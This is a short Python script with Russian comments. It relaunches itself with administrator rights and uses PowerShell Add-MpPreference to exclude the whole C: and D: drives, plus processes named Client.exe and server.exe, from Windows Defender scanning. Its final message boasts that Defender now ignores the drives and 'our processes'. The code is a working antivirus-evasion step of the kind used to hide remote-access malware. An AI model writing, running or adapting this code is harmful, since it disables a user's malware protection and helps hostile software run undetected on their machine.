# exclude_defender.py
import os
import subprocess
import sys
import ctypes

def add_exclusion(path):
    subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionPath "{path}"'], check=True)

def add_process_exclusion(proc):
    subprocess.run(['powershell', '-Command', f'Add-MpPreference -ExclusionProcess "{proc}"'], check=True)

# Запрос прав администратора
if not ctypes.windll.shell32.IsUserAnAdmin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()


add_exclusion("C:\\")
add_exclusion("D:\\")

# Исключаем процессы
add_process_exclusion("Client.exe")
add_process_exclusion("Client")
add_process_exclusion("server.exe")
add_process_exclusion("server")

print("Готово. Windows Defender теперь полностью игнорирует диски C:, D: и наши процессы.")
